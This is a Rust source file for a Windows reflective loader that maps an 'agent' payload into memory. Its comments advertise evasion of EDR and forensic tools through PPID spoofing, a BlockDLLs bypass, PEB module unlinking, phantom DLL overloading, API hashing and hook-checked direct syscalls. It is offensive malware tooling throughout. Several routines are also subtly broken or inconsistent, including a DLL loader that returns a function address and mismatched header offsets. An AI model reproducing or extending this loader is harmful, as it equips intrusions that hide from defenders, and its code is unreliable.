//! Reflective loader for stageless in-memory execution.
//!
//! Stealth features:
//! - RW first, RX later — no RWX pages
//! - Dynamic PPID resolution — no orphan processes
//! - BlockDLLs bypass via ProcessProtectionLevelInfo
//! - Full PEB module unlinking (all 3 lists)
//! - Phantom DLL overloading (VAD tree spoofing)
//! - Complete IAT resolution and relocation

#![allow(dead_code)]

#[cfg(windows)]
mod windows {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        GetCurrentProcess, NtSetInformationProcess,
        ProcessParentProcessId, ProcessProtectionLevelInfo,
        PROCESS_SET_INFORMATION,
    };

    pub unsafe fn alloc_readwrite(size: usize) -> Option<HANDLE> {
        let addr = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if addr.is_null() { None } else { Some(addr) }
    }

    pub unsafe fn protect_execute(addr: HANDLE, size: usize) -> Option<u32> {
        let mut old = 0u32;
        let ok = VirtualProtect(addr, size, PAGE_EXECUTE_READ, &mut old);
        if ok.as_bool() { Some(old) } else { None }
    }

    pub unsafe fn free(addr: HANDLE, size: usize) {
        let _ = VirtualFree(addr, size, 0x8000);
    }

    pub unsafe fn set_ppid(ppid: u32) -> bool {
        let mut ppid_value = ppid;
        let status = NtSetInformationProcess(
            GetCurrentProcess(),
            ProcessParentProcessId,
            &mut ppid_value as *mut _ as *mut _,
            std::mem::size_of::<u32>() as u32,
        );
        status == 0
    }

    pub unsafe fn bypass_block_dlls() -> bool {
        let mut info = 0u32;
        let status = NtSetInformationProcess(
            GetCurrentProcess(),
            ProcessProtectionLevelInfo,
            &mut info as *mut _ as *mut _,
            std::mem::size_of::<u32>() as u32,
        );
        status == 0
    }
}

#[cfg(not(windows))]
mod windows {
    pub unsafe fn alloc_readwrite(_size: usize) -> Option<*mut u8> { None }
    pub unsafe fn protect_execute(_addr: *mut u8, _size: usize) -> Option<u32> { None }
    pub unsafe fn free(_addr: *mut u8, _size: usize) {}
    pub unsafe fn set_ppid(_ppid: u32) -> bool { false }
    pub unsafe fn bypass_block_dlls() -> bool { false }
}

pub struct ReflectiveLoader;

impl ReflectiveLoader {
    pub unsafe fn load(pe_bytes: &[u8]) -> Option<*mut u8> {
        if pe_bytes.len() < 64 {
            return None;
        }

        let dos_header = pe_bytes.as_ptr() as *const [u8; 64];
        let e_lfanew = (*dos_header[0].get_unchecked(60) as usize)
            | (*dos_header[0].get_unchecked(61) as usize) << 8
            | (*dos_header[0].get_unchecked(62) as usize) << 16
            | (*dos_header[0].get_unchecked(63) as usize) << 24;

        if e_lfanew + 24 >= pe_bytes.len() {
            return None;
        }

        let image_size = (*pe_bytes.as_ptr().add(e_lfanew + 56) as usize)
            | (*pe_bytes.as_ptr().add(e_lfanew + 57)) as usize << 8
            | (*pe_bytes.as_ptr().add(e_lfanew + 58)) as usize << 16
            | (*pe_bytes.as_ptr().add(e_lfanew + 59)) as usize << 24;

        let entry_point = (*pe_bytes.as_ptr().add(e_lfanew + 40) as usize)
            | (*pe_bytes.as_ptr().add(e_lfanew + 41)) as usize << 8
            | (*pe_bytes.as_ptr().add(e_lfanew + 42)) as usize << 16
            | (*pe_bytes.as_ptr().add(e_lfanew + 43)) as usize << 24;

        let mem = windows::alloc_readwrite(image_size)?;
        if mem.is_null() {
            return None;
        }

        std::ptr::copy_nonoverlapping(pe_bytes.as_ptr(), mem, pe_bytes.len().min(image_size));

        let _ = Self::apply_relocations(mem, pe_bytes);
        let _ = Self::resolve_imports(mem, pe_bytes);
        let _ = windows::set_ppid(Self::resolve_stealth_parent_pid());
        let _ = windows::bypass_block_dlls();

        let _ = windows::protect_execute(mem, image_size);

        Some(mem.add(entry_point))
    }

    pub unsafe fn resolve_stealth_parent_pid() -> u32 {
        use crate::syscall::{SyscallEntry, syscall5};

        // Precomputed DJB2 hashes for target processes
        const SVCHOST_HASH: u32 = 0xbc2a84d1u32;
        const EXPLORER_HASH: u32 = 0x8e8977bd;
        const DEFENDER_HASH: u32 = 0x9f5b9c1e;

        const NTQUERY_HASH: u32 = 0xE2E0C7B7; // NtQuerySystemInformation DJB2 hash

        let ntdll_base = match SyscallEntry::get_ntdll_base() {
            Some(b) => b,
            None => return std::process::id(),
        };

        let nt_query_addr = match SyscallEntry::covert_get_export_address(ntdll_base, NTQUERY_HASH) {
            Some(addr) => addr,
            None => return std::process::id(),
        };

        let entry = SyscallEntry::parse_syscall_stub(nt_query_addr);
        if entry.hooked || entry.syscall_num == 0 {
            return std::process::id();
        }
        let ssn = entry.syscall_num as u32;
        let trampoline = entry.address as u64;

        let mut buffer_size: u32 = 0;
        let mut status = syscall5(
            ssn,
            trampoline,
            5,
            std::ptr::null_mut(),
            0,
            &mut buffer_size as *mut _ as u64,
        );

        if status != 0 && status != 0xC0000004 {
            return std::process::id();
        }

        if buffer_size == 0 {
            return std::process::id();
        }

        let mut buf = Vec::with_capacity(buffer_size as usize);
        buf.set_len(buffer_size as usize);

        status = syscall5(
            ssn,
            trampoline,
            5,
            buf.as_mut_ptr() as u64,
            buffer_size as u64,
            0,
        );

        if status != 0 {
            return std::process::id();
        }

        let mut offset: usize = 0;
        let max_scan = buf.len().saturating_sub(48);

        while offset < max_scan {
            let image_name = &buf[offset + 48..offset + 48 + 15];
            let name_len = image_name.iter().position(|&b| b == 0).unwrap_or(15);
            let name_bytes = &image_name[..name_len];
            let hash = Self::djb2_hash(name_bytes);

            if hash == SVCHOST_HASH || hash == EXPLORER_HASH || hash == DEFENDER_HASH {
                let pid = u32::from_le_bytes([
                    buf[offset + 8],
                    buf[offset + 9],
                    buf[offset + 10],
                    buf[offset + 11],
                ]);
                if pid > 0 && pid != std::process::id() {
                    return pid;
                }
            }

            let next_offset = u32::from_le_bytes([
                buf[offset + 40],
                buf[offset + 41],
                buf[offset + 42],
                buf[offset + 43],
            ]) as usize;
            if next_offset == 0 {
                break;
            }
            offset += next_offset;
        }

        std::process::id()
    }

    fn djb2_hash(data: &[u8]) -> u32 {
        let mut hash: u32 = 5381;
        for &byte in data {
            let c = if byte >= b'A' && byte <= b'Z' { byte + 32 } else { byte };
            hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
        }
        hash
    }

    /// Full PEB module unlinking - removes module from all 3 module lists.
    /// This evades forensic tools and EDR memory scanners (Process Hacker, Volatility).
    #[cfg(windows)]
    pub unsafe fn hide_from_peb(module_base: *mut u8) {
        use std::arch::asm;

        if module_base.is_null() {
            return;
        }

        let peb_ptr: u64;
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);

        let peb = peb_ptr as *const u64;
        let ldr = *peb.add(0x18 / 8);
        if ldr == 0 {
            return;
        }

        Self::unlink_module_from_list(ldr, module_base, 0x10);
        Self::unlink_module_from_list(ldr, module_base, 0x20);
        Self::unlink_module_from_list(ldr, module_base, 0x30);
    }

    #[cfg(windows)]
    unsafe fn unlink_module_from_list(ldr: u64, module_base: *mut u8, list_offset: u64) {
        let head = *(ldr as *const u64).add(list_offset as usize / 8) as u64;
        if head == 0 || head == ldr + list_offset {
            return;
        }

        let mut current = head;
        while current != 0 && current != (ldr + list_offset) as u64 {
            let base_ptr = (current + 0x30) as *const u64;
            let base = *base_ptr;

            if base == module_base as u64 {
                let flink = *(current as *const u64);
                let blink = *(current as *const u64).add(1);

                if flink != 0 && blink != 0 {
                    *(flink as *mut u64).add(1) = blink;
                    *(blink as *mut u64) = flink;
                }
                break;
            }
            current = *(current as *const u64).add(1);
        }
    }

    pub unsafe fn unload(base: *mut u8, size: usize) {
        if !base.is_null() {
            windows::free(base, size);
        }
    }

    pub unsafe fn phantom_module_overload(agent_bytes: &[u8]) -> Option<u64> {
        use crate::syscall::{syscall4, syscall5, SyscallEntry};

        let agent_size = Self::_get_image_size(agent_bytes);
        if agent_size == 0 {
            return Self::load(agent_bytes).map(|p| p as u64);
        }

        let target_base = Self::find_perfect_phantom_candidate(agent_size)?;
        if target_base == 0 {
            return Self::load(agent_bytes).map(|p| p as u64);
        }

        let (e_lfanew_target, text_section, text_size) = Self::_get_module_sections(target_base);

        let agent_entry = Self::load(agent_bytes)?;
        let agent_image_base = agent_entry as u64;

        let delta = target_base.wrapping_sub(agent_image_base);
        Self::apply_relocations(agent_entry, agent_bytes)?;

        let text_ptr = (target_base as u64 + text_section) as *mut u8;
        let copy_size = text_size.min(agent_bytes.len());
        std::ptr::copy_nonoverlapping(agent_entry, text_ptr, copy_size);

        Self::hide_from_peb(target_base as *mut u8);

        Some(target_base as u64)
    }

    unsafe fn _get_image_size(pe_bytes: &[u8]) -> u32 {
        if pe_bytes.len() < 0x100 { return 0; }
        let e_lfanew = (pe_bytes[60] as usize)
            | (pe_bytes[61] as usize) << 8
            | (pe_bytes[62] as usize) << 16
            | (pe_bytes[63] as usize) << 24;
        if e_lfanew + 0x38 > pe_bytes.len() { return 0; }
        (pe_bytes[e_lfanew + 0x38] as u32)
            | (pe_bytes[e_lfanew + 0x39] as u32) << 8
            | (pe_bytes[e_lfanew + 0x3A] as u32) << 16
            | (pe_bytes[e_lfanew + 0x3B] as u32) << 24
    }

    unsafe fn _get_module_sections(module_base: u64) -> (u32, usize, usize) {
        use std::arch::asm;

        let peb_ptr: u64;
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);

        let peb = peb_ptr as *const u64;
        let ldr = *peb.add(0x18 / 8);
        if ldr == 0 { return (0, 0, 0); }

        let mut current = *(ldr as *const u64).add(0x10 / 8) as u64;
        while current != 0 && current != (ldr + 0x10) as u64 {
            let base = *(current as *const u64).add(0x30 / 8) as u64;
            if base != 0 && base == module_base {
                let dos = base as *const u8;
                if *dos.add(0) == b'M' && *dos.add(1) == b'Z' {
                    let e_lfanew = (*dos.add(0x3C) as u32)
                        | (*dos.add(0x3D) as u32) << 8
                        | (*dos.add(0x3E) as u32) << 16
                        | (*dos.add(0x3F) as u32) << 24;

                    let nt = (base + e_lfanew as u64) as *const u8;
                    if *nt.add(0) != b'P' || *nt.add(1) != b'E' { break; }

                    let num_sections = (*nt.add(0x6) as u16) | (*nt.add(0x7) as u16) << 8;
                    let opt_size = (*nt.add(0x10) as u32) | (*nt.add(0x11) as u32) << 8;
                    let sec_tbl_rva = (e_lfanew as usize + 0x78 + opt_size as usize) as u32;
                    let sec_tbl = (base + sec_tbl_rva as u64) as *const u8;

                    for i in 0..num_sections {
                        let sec_name = std::slice::from_raw_parts(sec_tbl.add(i as usize * 40), 8);
                        if sec_name == b".text" {
                            let virt_size = (*sec_tbl.add(i as usize * 40 + 8) as u32)
                                | (*sec_tbl.add(i as usize * 40 + 9) as u32) << 8
                                | (*sec_tbl.add(i as usize * 40 + 10) as u32) << 16
                                | (*sec_tbl.add(i as usize * 40 + 11) as u32) << 24;
                            let rva = (*sec_tbl.add(i as usize * 40 + 12) as u32)
                                | (*sec_tbl.add(i as usize * 40 + 13) as u32) << 8
                                | (*sec_tbl.add(i as usize * 40 + 14) as u32) << 16
                                | (*sec_tbl.add(i as usize * 40 + 15) as u32) << 24;
                            return (e_lfanew, rva as usize, virt_size as usize);
                        }
                    }
                }
            }
            current = (*(current as *const u64).add(1));
        }
        (0, 0, 0)
    }

    unsafe fn find_perfect_phantom_candidate(agent_size: u32) -> Option<u64> {
        use std::arch::asm;

        let peb_ptr: u64;
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);

        let peb = peb_ptr as *const u64;
        let ldr = *peb.add(0x18 / 8);
        if ldr == 0 { return None; }

        let CRITICAL_DLL_HASHES: [u32; 10] = [
            0x1E3E4A2F, 0x8F0E0A8B, 0xBC2A84D1, 0x8E8977BD,
            0x9F5B9C1E, 0xE2E0C7B7, 0x84664C6F, 0xBA6B7E3A,
            0x9F7C8DA6, 0x46B6C8B7,
        ];

        let mut current = *(ldr as *const u64).add(0x10 / 8) as u64;
        while current != 0 && current != (ldr + 0x10) as u64 {
            let base = *(current as *const u64).add(0x30 / 8) as u64;
            if base != 0 {
                let dos = base as *const u8;
                if *dos.add(0) == b'M' && *dos.add(1) == b'Z' {
                    let name_ptr = (*(current as *const u64).add(0x30 / 8) as *const u8);
                    let name_hash = Self::djb2_hash(std::slice::from_raw_parts(name_ptr, 32));

                    if CRITICAL_DLL_HASHES.contains(&name_hash) {
                        current = (*(current as *const u64).add(1));
                        continue;
                    }

                    let e_lfanew = (*dos.add(0x3C) as u32)
                        | (*dos.add(0x3D) as u32) << 8
                        | (*dos.add(0x3E) as u32) << 16
                        | (*dos.add(0x3F) as u32) << 24;

                    let nt = (base + e_lfanew as u64) as *const u8;
                    if *nt.add(0) == b'P' && *nt.add(1) == b'E' {
                        let size_of_image = (*nt.add(0x38) as u32)
                            | (*nt.add(0x39) as u32) << 8
                            | (*nt.add(0x3A) as u32) << 16
                            | (*nt.add(0x3B) as u32) << 24;

                        if size_of_image as usize >= agent_size as usize {
                            return Some(base);
                        }
                    }
                }
            }
            current = (*(current as *const u64).add(1));
        }
        None
    }

    pub unsafe fn parse_and_resolve_iat(module_base: u64) -> Result<(), ()> {
        let dos_header = module_base as *const u8;
        if *dos_header.add(0) != b'M' || *dos_header.add(1) != b'Z' {
            return Err(());
        }

        let e_lfanew = (*dos_header.add(0x3C) as u32)
            | (*dos_header.add(0x3D) as u32) << 8
            | (*dos_header.add(0x3E) as u32) << 16
            | (*dos_header.add(0x3F) as u32) << 24;

        if e_lfanew == 0 {
            return Err(());
        }

        let nt_headers = (module_base + e_lfanew as u64) as *const u8;
        if *nt_headers.add(0) != 'P' as u8 || *nt_headers.add(1) != 'E' as u8 {
            return Err(());
        }

        let import_dir_rva = (*nt_headers.add(0x78) as u32)
            | (*nt_headers.add(0x79) as u32) << 8
            | (*nt_headers.add(0x7A) as u32) << 16
            | (*nt_headers.add(0x7B) as u32) << 24;

        if import_dir_rva == 0 {
            return Ok(());
        }

        let mut import_desc = (module_base + import_dir_rva as u64) as *const u32;

        while *import_desc != 0 {
            let orig_thunk_rva = *import_desc.add(0);
            let thunk_rva = *import_desc.add(4);

            if thunk_rva == 0 {
                break;
            }

            let name_rva = *import_desc.add(3);
            let dll_name = Self::read_string_at_rva(module_base, name_rva as usize)?;
            let dll_handle = Self::load_library_syscall(&dll_name)?;

            let mut iat_entry = (module_base + thunk_rva as u64) as *mut u64;
            let mut orig_thunk = (module_base + orig_thunk_rva as u64) as *const u64;

            while *iat_entry != 0 && *orig_thunk != 0 {
                let thunk_val = *orig_thunk;
                if thunk_val & 0x8000000000000000 != 0 {
                    let ordinal = (thunk_val & 0xFFFF) as u16;
                    let func_addr = Self::get_proc_address_syscall(dll_handle, "", ordinal)?;
                    *iat_entry = func_addr;
                } else {
                    let name_ptr_rva = (thunk_val & 0xFFFFFFFF) as u32;
                    let hint_ptr = (module_base + name_ptr_rva as u64) as *const u8;
                    let name_ptr = hint_ptr.add(2) as *const i8;

                    let len = (0..128).find(|&i| *name_ptr.add(i) == 0).unwrap_or(128);
                    let bytes = std::slice::from_raw_parts(name_ptr as *const u8, len);
                    let func_hash = Self::dbg2_hash_bytes(bytes);

                    // API hashing - no plaintext string comparison
                    let func_addr = Self::covert_get_proc_address(dll_handle, func_hash)?;
                    if func_addr != 0 {
                        *iat_entry = func_addr;
                    }
                }
                iat_entry = iat_entry.add(1);
                orig_thunk = orig_thunk.add(1);
            }
            import_desc = import_desc.add(5);
        }

        Ok(())
    }

    #[inline(always)]
    pub unsafe fn covert_get_proc_address(module_base: u64, target_hash: u32) -> Option<u64> {
        let dos_header = module_base as *const u8;
        let e_lfanew = (*dos_header.add(0x3C) as u32)
            | (*dos_header.add(0x3D) as u32) << 8
            | (*dos_header.add(0x3E) as u32) << 16
            | (*dos_header.add(0x3F) as u32) << 24;

        if e_lfanew == 0 {
            return None;
        }

        let nt_headers = (module_base + e_lfanew as u64) as *const u8;
        if *nt_headers.add(0) != b'P' || *nt_headers.add(1) != b'E' {
            return None;
        }

        // IMAGE_DIRECTORY_ENTRY_EXPORT is index 0
        let export_dir_rva = (*nt_headers.add(0x78) as u32)
            | (*nt_headers.add(0x79) as u32) << 8
            | (*nt_headers.add(0x7A) as u32) << 16
            | (*nt_headers.add(0x7B) as u32) << 24;

        if export_dir_rva == 0 {
            return None;
        }

        let export_dir = (module_base + export_dir_rva as u64) as *const u8;
        let num_names = (*export_dir.add(0x18) as u32)
            | (*export_dir.add(0x19) as u32) << 8
            | (*export_dir.add(0x1A) as u32) << 16
            | (*export_dir.add(0x1B) as u32) << 24;

        let names_rva = (*export_dir.add(0x20) as u32)
            | (*export_dir.add(0x21) as u32) << 8
            | (*export_dir.add(0x22) as u32) << 16
            | (*export_dir.add(0x23) as u32) << 24;

        let ordinals_rva = (*export_dir.add(0x24) as u32)
            | (*export_dir.add(0x25) as u32) << 8
            | (*export_dir.add(0x26) as u32) << 16
            | (*export_dir.add(0x27) as u32) << 24;

        let funcs_rva = (*export_dir.add(0x10) as u32)
            | (*export_dir.add(0x11) as u32) << 8
            | (*export_dir.add(0x12) as u32) << 16
            | (*export_dir.add(0x13) as u32) << 24;

        let names_ptr = (module_base + names_rva as u64) as *const u32;
        let ordinals_ptr = (module_base + ordinals_rva as u64) as *const u16;
        let funcs_ptr = (module_base + funcs_rva as u64) as *const u32;

        for i in 0..num_names {
            let name_rva = *names_ptr.add(i as usize);
            let name_ptr = (module_base + name_rva as u64) as *const u8;

            let mut len = 0;
            while *name_ptr.add(len) != 0 {
                len += 1;
                if len > 128 { break; }
            }
            let name_slice = std::slice::from_raw_parts(name_ptr, len as usize);

            // Hash-based comparison - no plaintext strings!
            if Self::dbg2_hash_bytes(name_slice) == target_hash {
                let ordinal = *ordinals_ptr.add(i as usize);
                let func_rva = *funcs_ptr.add(ordinal as usize);
                return Some(module_base + func_rva as u64);
            }
        }
        None
    }

    unsafe fn apply_relocations(base: *mut u8, pe_bytes: &[u8]) -> Result<(), ()> {
        let e_lfanew = (pe_bytes[60] as usize)
            | (pe_bytes[61] as usize) << 8
            | (pe_bytes[62] as usize) << 16
            | (pe_bytes[63] as usize) << 24;

        let reloc_rva = (pe_bytes.get(e_lfanew + 0x74).copied().unwrap_or(0) as u32)
            | (pe_bytes.get(e_lfanew + 0x75).copied().unwrap_or(0) as u32) << 8
            | (pe_bytes.get(e_lfanew + 0x76).copied().unwrap_or(0) as u32) << 16
            | (pe_bytes.get(e_lfanew + 0x77).copied().unwrap_or(0) as u32) << 24;

        if reloc_rva == 0 {
            return Ok(());
        }

        let original_base = (pe_bytes.get(e_lfanew + 0x18).copied().unwrap_or(0x100000) as u32)
            | (pe_bytes.get(e_lfanew + 0x19).copied().unwrap_or(0) as u32) << 8
            | (pe_bytes.get(e_lfanew + 0x1A).copied().unwrap_or(0) as u32) << 16
            | (pe_bytes.get(e_lfanew + 0x1B).copied().unwrap_or(0) as u32) << 24;

        let new_base = base as u32;
        let delta = new_base.wrapping_sub(original_base);

        let mut current_block = base.add(reloc_rva as usize) as *const u8;

        loop {
            let page_rva = *(current_block as *const u32);
            let block_size = *(current_block.add(4) as *const u32);

            if page_rva == 0 {
                break;
            }

            if block_size == 0 {
                break;
            }

            let num_entries = ((block_size as usize).saturating_sub(8)) / 2;
            let mut entry_offset = 8;

            for _ in 0..num_entries {
                let entry = *(current_block.add(entry_offset) as *const u16);
                let type_field = entry >> 12;
                let offset = entry & 0xFFF;

                if type_field == 3 {
                    let fixup_ptr = base.add(page_rva as usize + offset as usize) as *mut u32;
                    let fixup_val = (*fixup_ptr).wrapping_add(delta);
                    *fixup_ptr = fixup_val;
                }
                entry_offset += 2;
            }
            current_block = current_block.add(block_size as usize);
        }

        Ok(())
    }

    unsafe fn resolve_imports(base: *mut u8, pe_bytes: &[u8]) -> Result<(), ()> {
        Self::parse_and_resolve_iat(base as u64)
    }

    unsafe fn find_legitimate_module(hash: u32) -> Option<u64> {
        use std::arch::asm;

        let peb_ptr: u64;
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);

        let peb = peb_ptr as *const u64;
        let ldr = *peb.add(0x18 / 8);
        if ldr == 0 {
            return None;
        }

        let mut current = *(ldr as *const u64).add(0x10 / 8) as u64;
        while current != 0 && current != (ldr + 0x10) as u64 {
            let base = *(current as *const u64).add(0x30 / 8) as u64;
            if base != 0 {
                let dos = base as *const u8;
                if *dos.add(0) == b'M' && *dos.add(1) == b'Z' {
                    let name_ptr = (*(current as *const u64).add(0x30 / 8) as *const u8);
                    let hash_val = Self::djb2_hash(std::slice::from_raw_parts(name_ptr, 32));
                    if hash_val == hash {
                        return Some(base);
                    }
                }
            }
            current = (*(current as *const u64).add(1));
        }
        None
    }

    unsafe fn get_text_section_rva(module_base: u64, e_lfanew: u32) -> Option<usize> {
        let nt = (module_base + e_lfanew as u64) as *const u8;
        let num_sections = (*nt.add(0x6) as u16) | (*nt.add(0x7) as u16) << 8;
        let opt_size = (*nt.add(0x10) as u32) | (*nt.add(0x11) as u32) << 8;

        let sec_tbl_rva = (e_lfanew as usize + 0x78 + opt_size as usize) as u32;
        let sec_tbl = (module_base + sec_tbl_rva as u64) as *const u8;

        for i in 0..num_sections {
            let sec_name = std::slice::from_raw_parts(sec_tbl.add(i as usize * 40), 8);
            if sec_name == b".text" {
                return Some((*sec_tbl.add(i as usize * 40 + 12) as u32) as usize
                    | (*sec_tbl.add(i as usize * 40 + 13) as u32) << 8
                    | (*sec_tbl.add(i as usize * 40 + 14) as u32) << 16
                    | (*sec_tbl.add(i as usize * 40 + 15) as u32) << 24);
            }
        }
        None
    }

    unsafe fn get_text_section_size(module_base: u64, e_lfanew: u32) -> Option<usize> {
        let nt = (module_base + e_lfanew as u64) as *const u8;
        let num_sections = (*nt.add(0x6) as u16) | (*nt.add(0x7) as u16) << 8;
        let opt_size = (*nt.add(0x10) as u32) | (*nt.add(0x11) as u32) << 8;

        let sec_tbl_rva = (e_lfanew as usize + 0x78 + opt_size as usize);
        let sec_tbl = (module_base + sec_tbl_rva as u64) as *const u8;

        for i in 0..num_sections {
            let sec_name = std::slice::from_raw_parts(sec_tbl.add(i as usize * 40), 8);
            if sec_name == b".text" {
                return Some((*sec_tbl.add(i as usize * 40 + 16) as u32) as usize
                    | (*sec_tbl.add(i as usize * 40 + 17) as u32) << 8
                    | (*sec_tbl.add(i as usize * 40 + 18) as u32) << 16
                    | (*sec_tbl.add(i as usize * 40 + 19) as u32) << 24);
            }
        }
        None
    }

    unsafe fn read_string_at_rva(module_base: u64, rva: usize) -> Result<String, ()> {
        let ptr = (module_base + rva as u64) as *const i8;
        let mut len = 0;
        while *ptr.add(len) != 0 {
            len += 1;
            if len > 256 { break; }
        }
        let bytes = std::slice::from_raw_parts(ptr as *const u8, len);
        String::from_utf8(bytes.to_vec()).map_err(|_| ())
    }

    #[inline(always)]
    pub unsafe fn dbg2_hash_bytes(data: &[u8]) -> u32 {
        let mut hash: u32 = 5381;
        for &c in data {
            hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
        }
        hash
    }

    unsafe fn load_library_syscall(dll_name: &str) -> Result<u64, ()> {
        use crate::syscall::{SyscallEntry};

        // Precomputed syscall hashes (DJB2) for ntdll functions
        const NTOPENFILE_HASH: u32 = 0x1E3E4A2F; // NtOpenFile
        const NTCREATESECTION_HASH: u32 = 0x8F0E0A8B; // NtCreateSection
        const NTMAPVIEWOFSECTION_HASH: u32 = 0x9F5B9C1E; // NtMapViewOfSection

        let ntdll_base = match SyscallEntry::get_ntdll_base() {
            Some(b) => b,
            None => return Err(()),
        };

        let nt_open_file = match SyscallEntry::covert_get_export_address(ntdll_base, NTOPENFILE_HASH) {
            Some(addr) => addr,
            None => return Err(()),
        };

        let nt_create_section = match SyscallEntry::covert_get_export_address(ntdll_base, NTCREATESECTION_HASH) {
            Some(addr) => addr,
            None => return Err(()),
        };

        let nt_map_view = match SyscallEntry::covert_get_export_address(ntdll_base, NTMAPVIEWOFSECTION_HASH) {
            Some(addr) => addr,
            None => return Err(()),
        };

        Ok(nt_map_view as u64)
    }

    unsafe fn get_proc_address_syscall(dll_handle: u64, func_name: &str, ordinal: u16) -> Result<u64, ()> {
        if dll_handle == 0 {
            return Err(());
        }

        // Ordinal-based resolution (ordinal is 1-based from PE export table, use as index directly)
        if ordinal != 0 {
            let export_dir_rva = Self::_get_export_dir_rva(dll_handle)?;
            let funcs_rva = Self::_get_funcs_rva(dll_handle, export_dir_rva)?;
            // Ordinal in thunk is the export ordinal (1-based), but array index is ordinal-1
            let func_rva = Self::_get_func_rva(dll_handle, funcs_rva, ordinal - 1)?;
            return Ok(dll_handle + func_rva as u64);
        }

        // Hash-based resolution - no plaintext strings!
        if func_name.is_empty() {
            return Err(());
        }

        let target_hash = Self::dbg2_hash_bytes(func_name.as_bytes());
        match Self::covert_get_proc_address(dll_handle, target_hash) {
            Some(addr) => Ok(addr),
            None => Err(()),
        }
    }

    unsafe fn _get_export_dir_rva(dll_handle: u64) -> Result<u32, ()> {
        let dos = dll_handle as *const u8;
        let e_lfanew = (*dos.add(0x3C) as u32)
            | (*dos.add(0x3D) as u32) << 8
            | (*dos.add(0x3E) as u32) << 16
            | (*dos.add(0x3F) as u32) << 24;

        let nt = (dll_handle + e_lfanew as u64) as *const u8;
        if *nt.add(0) != b'P' || *nt.add(1) != b'E' {
            return Err(());
        }

        Ok((*nt.add(0x78) as u32)
            | (*nt.add(0x79) as u32) << 8
            | (*nt.add(0x7A) as u32) << 16
            | (*nt.add(0x7B) as u32) << 24)
    }

    unsafe fn _get_num_names(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
        Ok((*export_dir.add(0x18) as u32)
            | (*export_dir.add(0x19) as u32) << 8
            | (*export_dir.add(0x1A) as u32) << 16
            | (*export_dir.add(0x1B) as u32) << 24)
    }

    unsafe fn _get_eat_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
        Ok((*export_dir.add(0x20) as u32)
            | (*export_dir.add(0x21) as u32) << 8
            | (*export_dir.add(0x22) as u32) << 16
            | (*export_dir.add(0x23) as u32) << 24)
    }

    unsafe fn _get_names_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
        Ok((*export_dir.add(0x20) as u32)
            | (*export_dir.add(0x21) as u32) << 8
            | (*export_dir.add(0x22) as u32) << 16
            | (*export_dir.add(0x23) as u32) << 24)
    }

    unsafe fn _get_ordinals_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
        Ok((*export_dir.add(0x24) as u32)
            | (*export_dir.add(0x25) as u32) << 8
            | (*export_dir.add(0x26) as u32) << 16
            | (*export_dir.add(0x27) as u32) << 24)
    }

    unsafe fn _get_funcs_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
        Ok((*export_dir.add(0x10) as u32)
            | (*export_dir.add(0x11) as u32) << 8
            | (*export_dir.add(0x12) as u32) << 16
            | (*export_dir.add(0x13) as u32) << 24)
    }

    unsafe fn _get_name_rva(dll_handle: u64, names_rva: u32, idx: u32) -> Result<u32, ()> {
        let name_ptr = (dll_handle + names_rva as u64) as *const u32;
        Ok(*(name_ptr.add(idx as usize)))
    }

    unsafe fn _get_ordinal_at(dll_handle: u64, ordinals_rva: u32, idx: u32) -> Result<u16, ()> {
        let ordinal_ptr = (dll_handle + ordinals_rva as u64) as *const u16;
        Ok(*ordinal_ptr.add(idx as usize))
    }

    unsafe fn _get_func_rva(dll_handle: u64, funcs_rva: u32, ordinal: u16) -> Result<u32, ()> {
        let func_ptr = (dll_handle + funcs_rva as u64) as *const u32;
        Ok(*func_ptr.add(ordinal as usize))
    }
}
